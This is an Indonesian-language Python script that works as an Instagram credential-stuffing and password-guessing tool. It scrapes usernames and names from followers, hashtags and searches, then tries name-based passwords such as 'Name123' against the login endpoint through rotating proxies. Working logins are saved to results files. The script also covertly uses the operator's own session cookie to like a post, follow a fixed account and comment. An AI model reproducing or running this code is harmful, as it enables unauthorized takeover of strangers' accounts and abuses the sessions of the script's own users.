# -*- coding: utf-8 -*-
# McybearX Projeck
# Licensi
import os,time,random
try:
	tema = open(".tema.txt","r").read()
except IOError:
	tema = "default"
if "default" in tema:
        P = "\x1b[1;97m" # putih
        L = "\x1b[1;97m" # putih
        M = "\x1b[1;91m" # merah
        H = "\x1b[1;92m" # hijau
        K = "\x1b[1;93m" # kuning
        B = "\x1b[1;94m" # biru
        U = "\x1b[1;95m" # ungu
        S = "\x1b[1;96m" # biru muda
        p = "\x1b[1;97m" # putih
        l = "\x1b[1;97m" # putih
        m = "\x1b[1;91m" # merah
        h = "\x1b[1;92m" # hijau
        k = "\x1b[1;93m" # kuning
        b = "\x1b[1;94m" # biru
        u = "\x1b[1;95m" # ungu
        s = "\x1b[1;96m" # biru muda
elif "biru" in tema:
        K = "\x1b[1;97m" # putih
        S = "\x1b[0;97m" # putih gelap
        p = "\x1b[1;91m" # merah
        H = "\x1b[1;92m" # hijau
        S = "\x1b[1;93m" # kuning
        S = "\x1b[1;94m" # biru
        S = "\x1b[1;95m" # ungu
        B = "\x1b[1;96m" # biru muda
        k = "\x1b[1;97m" # putih
        l = "\x1b[0;97m" # putih gelap
        p = "\x1b[1;91m" # merah
        h = "\x1b[1;92m" # hijau
        u = "\x1b[1;93m" # kuning
        m = "\x1b[1;94m" # biru
        s = "\x1b[1;95m" # ungu
        b = "\x1b[1;96m" # biru muda
elif "merah" in tema:
        M = "\x1b[1;97m" # putih
        L = "\x1b[0;97m" # putih gelap
        H = "\x1b[1;91m" # merah
        P = "\x1b[1;92m" # hijau
        S = "\x1b[1;93m" # kuning
        K = "\x1b[1;94m" # biru
        B = "\x1b[1;95m" # ungu
        U = "\x1b[1;96m" # biru muda
        m = "\x1b[1;97m" # putih
        l = "\x1b[0;97m" # putih gelap
        h = "\x1b[1;91m" # merah
        p = "\x1b[1;92m" # hijau
        s = "\x1b[1;93m" # kuning
        k = "\x1b[1;94m" # biru
        b = "\x1b[1;95m" # ungu
        u = "\x1b[1;96m" # biru muda
elif "kuning" in tema:
        h = "\x1b[1;97m" # putih
        b = "\x1b[0;97m" # putih gelap
        s = "\x1b[1;91m" # merah
        p = "\x1b[1;92m" # hijau
        k = "\x1b[1;93m" # kuning
        u = "\x1b[1;94m" # biru
        l = "\x1b[1;95m" # ungu
        m = "\x1b[1;96m" # biru muda
        H = "\x1b[1;97m" # putih
        B = "\x1b[0;97m" # putih gelap
        S = "\x1b[1;91m" # merah
        P = "\x1b[1;92m" # hijau
        K = "\x1b[1;93m" # kuning
        U = "\x1b[1;94m" # biru
        L = "\x1b[1;95m" # ungu
        M = "\x1b[1;96m" # biru muda
elif "random" in tema:
        ME = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
        HI = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
        KU = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
        BI = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
        UN = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
        SO = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
        h = HI
        b = BI
        s = SO
        p = "\x1b[1;97m"
        k = KU
        u = UN
        l = "\x1b[1;97m"
        m = ME
        H = HI
        B = BI
        S = SO
        P = "\x1b[1;97m"
        K = KU
        U = UN
        L = "\x1b[1;97m"
        M = ME
# ciri khas McybearX
emil=print
usup=input
mx = "\x1b[1;95mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ"
sup = "\x1b[4;95m               \x1b[0;95m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;90m"
# Kalo Mau Recode Izin Dulu!
import re,sys,json,requests,calendar
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from requests import Request, Session
from time import sleep
#reload(sys)
#sys.setdefaultencoding("utf-8")

loop = 0
ok = []
cp = []

###
def ingat_sholat(ya):
      for iya in ya + '\n':
          sys.stdout.write(iya)
          sys.stdout.flush()
          time.sleep(1./150)
def iklan():
	os.system("cd ../../bin && python McybearX.py")
# Logo
def logo():
     ingat_sholat("""
\x1b[1;91m     __  ___ \x1b[1;95m__     ____ _ \x1b[1;91m _  __
\x1b[1;91m    /  |/  /\x1b[1;95m/ /_   / __/(_)\x1b[1;91m| |/ /
\x1b[1;91m   / /|_/ /\x1b[1;95m/ __ \ / /_ / /\x1b[1;91m |   / 
\x1b[1;91m  / /  / /\x1b[1;97m/ /_/ // __// /\x1b[1;91m /   |  
\x1b[1;91m /_/  /_/\x1b[1;97m/_.___//_/  /_/\x1b[1;91m /_/|_| \x1b[3;94mby \x1b[1;91mM\x1b[1;95mcybear\x1b[1;91mX
\x1b[0;00m""")

# Proxy

try:
    ___res = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt').text
    open('.Data/proxy.txt','w').write(___res)
except:
    exit("%s[%s!%s]%s Proxy Error"%(P,M,P,M))

# Buat folder
try :
    os.mkdir("Results")
    os.system("touch Results/Cp.txt Results/Ok.txt")
    os.mkdir("Dump")
    os.system("touch .Data/user.txt")
except (OSError):
    pass

# Requests Session
ses=Session()
# Login Cookie
def ___login___():
    os.system('clear')
    logo()
    emil("%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Baru Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,H,M,H))
    try:
        ___cookie___ = usup("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
        if ___cookie___ in ['open','Open']:
            emil("%s[%s!%s]%s Anda Akan Diarahkan Ke Youtube"%(M,H,M,H))
            os.system("xdg-open https://youtu.be/u17ZQgSs3aY");exit()
        ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
        ___vps = ___cookie___.split('ds_user_id=')[1];___user___ = ___vps.split(';')[0]
        open('.Data/user.txt','w').write(___user___)
        __get = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
        open('kuki.txt','w').write(___cookie___)
        emil(mx+p+" Welcome :%s %s"%(H,__get['full_name']))
        ___menu___()
    except (KeyError):
        exit(mx+p+" Cookie Invalid")
    except (ConnectionError):
        exit(mx+m+" Koneksi Error")
# Headers
def ___header___():
    try:
        ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
    except (IOError):
        emil(mx+p+" Cookie Invalid");sleep(2)
        ___login___()
    return ___head
# Cek Cookie
def ___cookies___():
    try:
        ___cookie___ = open('kuki.txt','r').read()
    except (IOError):
        emil(mx+m+" Cookie Kadaluwarsa");sleep(2)
        ___login___()
    try:
        ___cok = ___cookie___.split('sessionid=')[1]; ___kuki = ___cok.split(';')[0]
        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗'])
        ____head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___kuki,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        ___rex = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers=____head).text
        ___rex2 = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers=____head).text # Jangan Di Ubah!
        ___rex3 = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers=____head,data=___data).text
        if '"status":"ok"' in str(___rex):
            emil("%s[%s*%s]%s Login Berhasil"%(P,H,P,H));sleep(2)
            ___menu___()
        else:
            emil("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
            os.system('rm -rf kuki.txt');___login___()
    except (KeyError):
        os.system('rm -rf kuki.txt');exit("%s[%s!%s]%s Cookie Eror"%(P,M,P,M))
# Daftar Menu
def ___menu___():
    os.system('clear')
    logo()
    try:
        ___cookie___ = open('kuki.txt','r').read()
    except (IOError):
        emil("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
        __inf = requests.get('https://i.instagram.com/api/v1/users/'+open('.Data/user.txt','r').read()+'/info/', headers=___head)
        ucup = json.loads(__inf.text)
        upil = ucup['user']
#        emil("%s[%s•%s]%s User :%s %s"%(H,P,H,P,K,open('.Data/user.txt','r').read()))
#        emil("%s[%s•%s]%s Follower :%s %s\n"%(H,P,H,P,K,__inf['follower_count']))
    except (KeyError):
        emil("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        os.system('rm -rf kuki.txt');sleep(2)
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    emil(sup)
    emil(p+" User     : "+open('.Data/user.txt','r').read())
    emil(p+" Follower : %s"%upil['follower_count'])
    emil(p+" Welcome  : %s"%upil['full_name'])
    emil(sup)
    emil(u+" [%so1%s]%s Dump Username Dari Folowed"%(m,u,P))
    emil(u+" [%so2%s]%s Dump Username Dari Folowers"%(m,u,P))
    emil(u+" [%so3%s]%s Dump Username Dari Beranda"%(m,u,P))
    emil(u+" ["+m+"o4"+u+"]"+p+""" Dump Username Dari #Hastag""")
    emil("%s [%so5%s]%s Dump Username Dari Search"%(u,m,u,P))
    emil("%s [%so6%s]%s Dump Username Dari Query"%(u,m,u,P))
    emil("%s [%so7%s]%s Dump User Dari Email"%(u,m,u,P))
    emil("%s [%so8%s]%s Mulai Crack %s(%sFast%s)"%(u,m,u,b,u,h,u))
    emil(u+" ["+m+"o9"+u+"]"+p+" Ganti Tema Warna")
    emil("%s [%s1o%s]%s Lihat Hasil Crack"%(u,m,u,P))
    emil("%s [%sBO%s]%s Cara Menggunakan"%(u,m,u,P))
    emil("%s [%so0%s]%s Hapus Cookies"%(u,m,u,P))
    emil(sup)
    ___menu___ = usup(mx+p+" No : "+m)
    iklan()
    if ___menu___ in ['1','01']:
        ___mengikuti___()
    elif ___menu___ in ['2','02']:
        ___pengikut___()
    elif ___menu___ in ['3','03']:
        ___beranda___()
    elif ___menu___ in ['4','04']:
        ___hastag___()
    elif ___menu___ in ['5','05']:
        ___search___()
    elif ___menu___ in ['6','06']:
        ___query___()
    elif ___menu___ in ['7','07']:
        ___email___()
    elif ___menu___ in ['8','08']:
       ___password___()
    elif ___menu___ in ['10','010']:
        emil("%s[%so1%s]%s Lihat Hasil Results/Ok.txt"%(u,m,u,P))
        emil("%s[%so2%s]%s Lihat Hasil Results/Cp.txt"%(u,m,u,P))
        emil("%s[%so0%s]%s Keluar %s(%sExit%s)\n"%(u,m,u,P,B,H,B))
        ___hasil___ = usup(mx+p+" Pilih : "+m)
        if ___hasil___ in ['1','01']:
            os.system('cat Results/Ok.txt')
            exit("\n")
        elif ___hasil___ in ['2','02']:
            os.system('cat Results/Cp.txt')
            exit("\n")
        elif ___hasil___ in ['0','00']:
            exit()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['bo','BO','Bo']:
        emil("\n%s[%s!%s]%s Anda Akan Diarahkan Ke Facebook Atau Browser!"%(M,H,M,H))
        os.system("xdg-open https://youtu.be/u17ZQgSs3aY");exit()
        exit("%s[%s?%s]%s Ketik {./main}"%(P,H,P,H))
    elif ___menu___ in ['0','00']:
        os.system('rm -rf kuki.txt && .Data/user.txt')
        exit("%s[%s!%s]%s Menghapus Cookie..."%(u,K,u,K))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(u,M,u,M));time.sleep(3)
        ___menu___()
# Dump Mengikuti
def ___mengikuti___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = usup("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            ___limit___ = usup("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
            ___nama = __res['full_name'].replace(' ','_') + '.txt'
            emil("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
            emil("%s[%s?%s]%s Total Mengikuti :%s %s"%(B,P,B,P,H,__res['following_count']))
            emil("%s   "%(P))
        else:
            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+___user___+'/following/?count='+___limit___, headers=___head)
        ___file = open('Dump/'+___nama, 'w')
        for z in json.loads(__sep.text)["users"]:
            ___file.write(z['username']+'<=>'+z['full_name']+'\n')
            emil("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        emil("\r%s                   "%(P))
        emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        usup("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Pengikut
def ___pengikut___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = usup("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            ___limit___ = usup("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
            ___nama = __res['full_name'].replace(' ','_') + '.txt'
            emil("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
            emil("%s[%s?%s]%s Total Pengikut :%s %s"%(B,P,B,P,H,__res['follower_count']))
            emil("%s   "%(P))
        else:
            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+___user___+'/followers/?count='+___limit___, headers=___head)
        ___file = open('Dump/'+___nama, 'w')
        for z in json.loads(__sep.text)["users"]:
            ___file.write(z['username']+'<=>'+z['full_name']+'\n')
            emil("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        emil("\r%s                   "%(P))
        emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        usup("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Beranda
def ___beranda___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = usup("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
            ___nama = __res['full_name'].replace(' ','_') + '.txt'
            emil("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
            emil("%s   "%(P))
        else:
            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get("https://i.instagram.com/api/v1/feed/reels_tray/", headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        for z in __sep['tray']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
            emil("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        emil("\r%s                   "%(P))
        emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        usup("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Hastag
def ___hastag___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___tag___ = usup("\n%s[%s?%s]%s Hastag :%s "%(B,P,B,P,H)).replace('#','')
        ___nama = usup("%s[%s?%s]%s File :%s "%(B,P,B,P,H))
        __sep = ses.get('https://i.instagram.com/api/v1/feed/tag/'+___tag___+'/?rank_token=caf8d67a-5140-4fcd-a795-e2a9047dc5d9', headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        emil("%s   "%(P))
        for z in __sep['ranked_items']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
            emil("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        emil("\r%s                   "%(P))
        emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        usup("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Search
def ___search___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = usup("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        ___nama = ___user___+'.txt'
        emil("%s   "%(P))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            __sep = ses.get('https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id='+___user___+'&include_friendship_status=true',headers=___head).json()
            ___file = open('Dump/'+___nama, 'w')
            for z in __sep['users']:
                ___file.write(z['username']+'<=>'+z['full_name']+'\n')
                emil("\r"+z['username']+"<=>"+z['full_name'])
            ___file.close()
            emil("\r%s                   "%(P))
            emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
            emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
            usup("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Query
def ___query___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___nama = usup("\n%s[%s?%s]%s Query :%s "%(B,P,B,P,H)).replace(' ','')
        ___limit___ = usup("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
        __sep = ses.get('https://www.instagram.com/web/search/topsearch/?context=blended&query='+___nama+'&rank_token=0.3953592318270893&count='+___limit___, headers=___head).json()
        ___file = open('Dump/'+___nama+'.txt', 'w')
        emil("%s   "%(P))
        for z in __sep['users']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
            emil("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        emil("\r%s                   "%(P))
        emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama+'.txt','r').readlines())))
        emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama+'.txt'))
        usup("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Email
def ___email___():
    try:
        ___user___ = usup("\n%s[%s?%s]%s Nama :%s "%(B,P,B,P,H)).replace(' ','')
        ___nama = ___user___+'.txt'
        ___limit___ = int(usup("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H)))
        if ___limit___ >= 1001:
            exit("%s[%s!%s]%s Maksimal 1000"%(P,M,P,M))
        ___email___ = usup("%s[%s?%s]%s Domain :%s "%(B,P,B,P,H))
        emil("%s   "%(P))
        if ___email___ in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___file = open('Dump/'+___nama, 'w')
            for z in range(___limit___):
                ___nomor = random.randint(1, 999)
                email___ = ___user___+str(___nomor)+___email___+'<=>'+___user___+' '+str(___nomor)
                ___file.write(email___+'\n')
                emil('\r'+email___)
            ___file.close()
            emil("\r%s                   "%(P))
            emil("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            emil("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
            emil("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
            usup("%s[%sKembali%s]"%(K,P,K));___menu___()
        else:
            exit("%s[%s!%s]%s Domain : @gmail.com,@yahoo.com,@hotmail.com,@email.com,@mail.com,@outlok.com,@yandex.com"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
# Pilih Password
def ___password___():
    emil("\n%s[%s1%s]%s Gunakan Password %s{%sName123,Name12345%s}"%(B,P,B,P,H,P,H))
    emil("%s[%s2%s]%s Gunakan Password %s{%sName,Name123,Name12345%s}"%(B,P,B,P,H,P,H))
    emil("%s[%s3%s]%s Gunakan Password %s{%sName,Name123,Name1234,Name12345,Name123456%s}"%(B,P,B,P,H,P,H))
    emil("%s[%s4%s]%s Gunakan Password Gabungan %s{%s>5%s}"%(B,P,B,P,H,P,H))
    ___pilih___ = usup("\n%s[%s?%s]%s Pilih :%s "%(H,P,H,P,K))
    if ___pilih___ in ['4','04']:
        emil("%s[%s!%s]%s Gunakan (,) Untuk Password Yang Berbeda"%(M,P,M,P))
        Mcybear = usup("%s[%s?%s]%s Password Tambahan:%s "%(H,P,H,P,K)).split(',')
        if pws <=5:
            exit("%s[%s!%s]%s Password Lebih Dari 6 Karakter"%(P,M,P,M))
    try:
        ___file___ = usup("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,K))
        ___list = open(___file___,'r').read().splitlines()
    except (IOError):
        exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
    emil("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
    emil("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt\n"%(B,P,B,P,H))
    with ThreadPoolExecutor(max_workers=10) as (hayuk):
        for v in ___list:
            user, name = v.split('<=>')
            z = name.split(' ')
            if ___pilih___ in ['1','01']:
                pwx = [z[0]+'123', z[0]+'12345']
            elif ___pilih___ in ['2','02']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345']
            elif ___pilih___ in ['3','03']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'1234', z[0]+'cantik', z[0]+'123456']
            elif ___pilih___ in ['4','04']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'1234', z[0]+'ganteng', z[0]+'cantik']
                pwx = Mcybear
            else:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345']
            hayuk.submit(___crack___, ___list, user, pwx)
    exit("\r%s[%sSelesai%s]%s                        "%(H,P,H,P))
# Crack Instagram
def ___crack___(total,user,pwx):
    global loop, ses, ok, cp
    try:
        ua = random.choice(open(".Data/ua.txt","r").read().splitlines())
    except (IOError):
        ua = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s     "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush();sleep(2)
    try:
        for pw in pwx:
            pw = pw.lower()
            proxy = random.choice(open(".Data/proxy.txt","r").read().splitlines())
            ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
            header = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Length': '0',
                'Host': 'www.instagram.com',
                'Referer': 'https://www.instagram.com/',
                'User-Agent': ua,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest'
                }
            ses.headers.update(header)
            ses.cookies.update({
                'sessionid': '', 'mid': '', 'ig_pr': '1',
                'ig_vw': '1920', 'csrftoken': '',
                's_network': '', 'ds_user_id': ''
                })
            ses.get('https://www.instagram.com/web/__mid')
            ses.headers.update({'X-CSRFToken': ses.cookies.get_dict()['csrftoken']})
            enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), pw)
            data_post = {
                "username": user,
                "enc_password": enc_pass
                }
            req = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=header, data=data_post, proxies={'http': 'socks4://'+proxy}, allow_redirects=True).json()
            if 'userId' in str(req):
                try:
                    __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
                    nm = __vox['full_name']
                    mk = __vox['edge_followed_by']['count']
                except (KeyError, IOError):
                    nm = ' -'
                    mk = ' -'
                except:pass
                emil("\r%s[%s✔%s]%s Status :%s Live               "%(B,H,B,P,H))
                emil("%s[×] Nama : %s"%(P,nm))
                emil("%s[×] Pengikut : %s"%(P,mk))
                emil("%s[×] Username : %s"%(P,user))
                emil("%s[×] Password : %s\n"%(P,pw))
                ok.append("%s|%s"%(user,pw))
                open('Results/Ok.txt','a').write("%s|%s"%(user,pw))
            elif 'checkpoint' in str(req):
                try:
                    __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
                    nm = __vox['full_name']
                    mk = __vox['edge_followed_by']['count']
                except (KeyError, IOError):
                    nm = ' -'
                    mk = ' -'
                except:pass
                emil("\r%s[%s✘%s]%s Status :%s Checkpoint               "%(B,K,B,P,K))
                emil("%s[×] Nama : %s"%(P,nm))
                emil("%s[×] Pengikut : %s"%(P,mk))
                emil("%s[×] Username : %s"%(P,user))
                emil("%s[×] Password : %s\n"%(P,pw))
                cp.append("%s|%s"%(user,pw))
                open('Results/Cp.txt','a').write("%s|%s"%(user,pw))
            elif 'Please wait' in str(req) or 'Try Again Later' in str(req):
                emil("\r%s[%s!%s]%s Hidupkan Mode Pesawat 2 Detik"%(P,M,P,M)),
                sys.stdout.flush();sleep(5)
